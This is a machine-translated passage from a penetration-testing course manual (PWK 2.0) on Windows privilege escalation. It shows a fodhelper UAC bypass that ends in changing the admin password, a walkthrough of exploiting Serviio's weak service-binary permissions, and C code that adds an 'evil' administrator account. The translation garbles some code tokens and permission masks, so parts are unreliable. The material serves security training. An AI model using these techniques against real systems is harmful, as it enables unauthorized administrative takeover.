<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:133588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置值并</font><font style="vertical-align: inherit;">再次</font><font style="vertical-align: inherit;">运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fodhelper.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后，我们会看到一条命令</font></font></nobr></div>
<div style="position:absolute;top:133607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">壳：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:134067;left:272"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 290：通过 fodhelper.exe 生成高权限 cmd.exe</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:134098;left:109"><nobr><font style="vertical-align: inherit;"></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami /groups</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">的输出</font><font style="vertical-align: inherit;">表明这是一个高完整性命令外壳。</font></font></nobr></div>
<div style="position:absolute;top:134118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将尝试更改管理员密码以查看是否可以成功绕过 UAC：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:134152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">net user admin Ev!lpass</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:134170;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令成功完成。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:134189;left:131"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 563 - 通过生成具有高完整性的 cmd.exe 后成功更改管理员用户的密码</font></font></i></nobr></div>
<div style="position:absolute;top:134205;left:421"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帮助程序</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:134234;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码修改成功，我们成功绕过了UAC！</font></font></nobr></div>
<div style="position:absolute;top:134267;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这次攻击不仅展示了一个了不起的 UAC 绕过，而且还揭示了一个过程，我们可以</font></font></nobr></div>
<div style="position:absolute;top:134286;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于发现类似的旁路。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:134419;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="114"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 114 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:134452;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:135529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:135529;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:135529;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">555</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:134548;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2.3.2 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:134578;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 以管理员用户身份登录您的 Windows 客户端并尝试使用</font></font></nobr></div>
<div style="position:absolute;top:134597;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上面介绍的应用和技术。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:134632;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2.4</font></font></i></nobr></div>
<div style="position:absolute;top:134632;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不安全的文件权限：Serviio 案例研究</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:134669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如前所述，在 Windows 系统上提升权限的一种常见方法是利用</font></font></nobr></div>
<div style="position:absolute;top:134689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nt authority\system</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行的服务的文件权限不安全</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:134722;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，考虑这样一个场景，其中软件开发人员创建了一个作为</font></font></nobr></div>
<div style="position:absolute;top:134741;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">视窗服务。</font><font style="vertical-align: inherit;">在安装过程中，开发者没有保护用户的权限</font></font></nobr></div>
<div style="position:absolute;top:134761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">程序，允许对</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Everyone </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">524</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组的</font><font style="vertical-align: inherit;">所有成员进行完全读写访问</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">因此，</font></font></nobr></div>
<div style="position:absolute;top:134780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">低权限用户可以用恶意程序替换该程序。</font><font style="vertical-align: inherit;">当服务是</font></font></nobr></div>
<div style="position:absolute;top:134799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重新启动或机器重新启动，恶意文件将以系统权限执行。</font></font></nobr></div>
<div style="position:absolute;top:134832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这种类型的漏洞存在于我们的 Windows 客户端上。</font><font style="vertical-align: inherit;">让我们验证漏洞并利用它。</font></font></nobr></div>
<div style="position:absolute;top:134865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在前面的一节中，我们展示了如何使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tasklist</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列出正在运行的服务</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">或者，</font></font></nobr></div>
<div style="position:absolute;top:134884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以将 PowerShell </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-WmiObject</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> cmdlet 与</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">win32_service</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> WMI 类一起使用。</font><font style="vertical-align: inherit;">在这</font></font></nobr></div>
<div style="position:absolute;top:134903;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们将输出管道到</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Select-Object</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以显示我们感兴趣的字段和</font></font></nobr></div>
<div style="position:absolute;top:134923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Where-Object</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示正在运行的服务（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{$_.State -like 'Running'}</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:134958;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\student&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-WmiObject win32_service | </font><font style="vertical-align: inherit;">选择对象名称、状态、路径名</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:134975;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">Where-Object {$_.State -like 'Running'}</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:135009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:135009;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">状态路径名</font></font></nobr></div>
<div style="position:absolute;top:135026;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:135026;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----- --------</font></font></nobr></div>
<div style="position:absolute;top:135043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AudioEndpointBuilder 运行 C:\Windows\System32\svchost.exe -k LocalSystemNetworkRes</font></font></nobr></div>
<div style="position:absolute;top:135060;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">音频服务器    </font></font></nobr></div>
<div style="position:absolute;top:135060;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行 C:\Windows\System32\svchost.exe -k LocalServiceNetworkRe</font></font></nobr></div>
<div style="position:absolute;top:135077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:135094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">力量    </font></font></nobr></div>
<div style="position:absolute;top:135094;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行 C:\Windows\system32\svchost.exe -k DcomLaunch</font></font></nobr></div>
<div style="position:absolute;top:135111;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">教授    </font></font></nobr></div>
<div style="position:absolute;top:135111;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行 C:\Windows\system32\svchost.exe -k netsvcs</font></font></nobr></div>
<div style="position:absolute;top:135127;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RpcEpt映射器    </font></font></nobr></div>
<div style="position:absolute;top:135127;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行 C:\Windows\system32\svchost.exe -k RPCSS</font></font></nobr></div>
<div style="position:absolute;top:135144;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务端    </font></font></nobr></div>
<div style="position:absolute;top:135144;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行 C:\Windows\system32\svchost.exe -k rpcss</font></font></nobr></div>
<div style="position:absolute;top:135162;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">萨姆斯    </font></font></nobr></div>
<div style="position:absolute;top:135162;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行 C:\Windows\system32\lsass.exe</font></font></nobr></div>
<div style="position:absolute;top:135179;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日程    </font></font></nobr></div>
<div style="position:absolute;top:135179;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行 C:\Windows\system32\svchost.exe -k netsvcs</font></font></nobr></div>
<div style="position:absolute;top:135196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">感测器    </font></font></nobr></div>
<div style="position:absolute;top:135196;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行 C:\Windows\system32\svchost.exe -k netsvcs</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:135212;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务    </font></font></b></nobr></div>
<div style="position:absolute;top:135212;left:287"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行 C:\Program Files\Serviio\bin\ServiioService.exe</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:135229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ShellHWDetection 运行 C:\Windows\System32\svchost.exe -k netsvcs</font></font></nobr></div>
<div style="position:absolute;top:135246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:135266;left:266"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 564 - 使用 PowerShell 列出 Windows 上正在运行的服务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:135295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据此输出，Serviio 服务脱颖而出，因为它安装在 Program Files 目录中。</font></font></nobr></div>
<div style="position:absolute;top:135315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这意味着该服务是用户安装的，软件开发人员负责目录</font></font></nobr></div>
<div style="position:absolute;top:135334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">软件的结构和权限。</font><font style="vertical-align: inherit;">这些情况使它更容易出现这种情况</font></font></nobr></div>
<div style="position:absolute;top:135353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞类型。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:135479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">524 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:135607;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="115"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 115 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:135640;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:136717;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:136717;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:136717;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">556</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:135736;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为下一步，我们将使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">icacls </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">525</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows</font><font style="vertical-align: inherit;">枚举目标服务的权限</font></font></nobr></div>
<div style="position:absolute;top:135755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公用事业。</font><font style="vertical-align: inherit;">此实用程序将输出服务的安全标识符（或 SID </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">526</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），后跟一个权限</font></font></nobr></div>
<div style="position:absolute;top:135774;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">掩码，在 icacls 文档中定义。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">527</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最相关的掩码和权限</font></font></nobr></div>
<div style="position:absolute;top:135794;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下面列出：</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:135827;left:337"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">屏蔽权限</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:135849;left:337"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">F</font></font></nobr></div>
<div style="position:absolute;top:135849;left:397"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完全访问</font></font></nobr></div>
<div style="position:absolute;top:135869;left:337"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">米</font></font></nobr></div>
<div style="position:absolute;top:135869;left:397"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">修改权限</font></font></nobr></div>
<div style="position:absolute;top:135889;left:337"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接收</font></font></nobr></div>
<div style="position:absolute;top:135889;left:397"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">读取和执行访问</font></font></nobr></div>
<div style="position:absolute;top:135909;left:337"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">电阻</font></font></nobr></div>
<div style="position:absolute;top:135909;left:397"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只读访问</font></font></nobr></div>
<div style="position:absolute;top:135929;left:337"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">宽</font></font></nobr></div>
<div style="position:absolute;top:135929;left:397"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只写访问</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:135949;left:362"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表 7 - icacls 权限掩码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:135979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">icacls</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，将完整的服务名称作为参数传递。</font><font style="vertical-align: inherit;">命令输出将</font></font></nobr></div>
<div style="position:absolute;top:135998;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举关联的权限：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:136033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\student&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">icacls "C:\Program Files\Serviio\bin\ServiioService.exe"</font></font></font></b></nobr></div>
<div style="position:absolute;top:136050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Program Files\Serviio\bin\ServiioService.exe </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BUILTIN\Users:(I)(F)</font></font></font></b></nobr></div>
<div style="position:absolute;top:136067;left:498"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT AUTHORITY\SYSTEM:(I)(F)</font></font></nobr></div>
<div style="position:absolute;top:136084;left:498"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内置\管理员：(I)(F)</font></font></nobr></div>
<div style="position:absolute;top:136101;left:498"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序包授权\所有应用程序</font></font></nobr></div>
<div style="position:absolute;top:136118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ICATION 包:(I)(RX)</font></font></nobr></div>
<div style="position:absolute;top:136152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功处理1个文件；</font><font style="vertical-align: inherit;">处理 0 个文件失败</font></font></nobr></div>
<div style="position:absolute;top:136171;left:289"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 565 - ServiioService.exe 服务的 icacls 输出</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:136201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如所怀疑的，与</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ServiioService.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可执行文件</font><font style="vertical-align: inherit;">相关的权限</font><font style="vertical-align: inherit;">相当</font></font></nobr></div>
<div style="position:absolute;top:136220;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有趣的。</font><font style="vertical-align: inherit;">具体来说，似乎系统上的任何用户 (BUILTIN\Users) 都具有完整的读取和</font></font></nobr></div>
<div style="position:absolute;top:136239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对它的写访问。</font><font style="vertical-align: inherit;">这是一个严重的漏洞。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">528</font></font></font></nobr></div>
<div style="position:absolute;top:136272;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了利用这种类型的漏洞，我们可以用我们自己的替换ServiioService.exe</font></font></nobr></div>
<div style="position:absolute;top:136292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">恶意二进制文件，然后通过重新启动服务或重新启动机器来触发它。</font></font></nobr></div>
<div style="position:absolute;top:136324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将通过一个例子来演示这种攻击。</font><font style="vertical-align: inherit;">以下 C 代码将创建一个名为“evil”的用户</font></font></nobr></div>
<div style="position:absolute;top:136344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">529</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能</font><font style="vertical-align: inherit;">将该用户添加到本地管理员组</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">编译的</font></font></nobr></div>
<div style="position:absolute;top:136363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此代码的版本将用作我们的恶意二进制文件：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:136398;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#include &lt;stdlib.h&gt;</font></font></nobr></div>
<div style="position:absolute;top:136432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">int主（）</font></font></nobr></div>
<div style="position:absolute;top:136449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></nobr></div>
<div style="position:absolute;top:136466;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">国际我;</font></font></nobr></div>
<div style="position:absolute;top:136500;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">i = system ("net user evil Ev!lpass /add");</font></font></nobr></div>
<div style="position:absolute;top:136517;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">i = system ("net localgroup administrators evil /add");</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:136573;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">525 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls</font></font></font></nobr></div>
<div style="position:absolute;top:136593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">526 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://support.microsoft.com/en-us/help/243330/well-known-security-identifiers-in-windows-operating-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:136608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:136627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">527 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls#remarks</font></font></font></nobr></div>
<div style="position:absolute;top:136647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">528 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Gjoko Krstic，2017），https://www.exploit-db.com/exploits/41959/</font></font></font></nobr></div>
<div style="position:absolute;top:136667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">529 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2016 年），https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=vs-2019</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:136795;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="116"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 116 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:136828;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:137905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:137905;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:137905;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">557</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:136940;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回0；</font></font></nobr></div>
<div style="position:absolute;top:136957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:136977;left:379"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 566 - adduser.c 代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
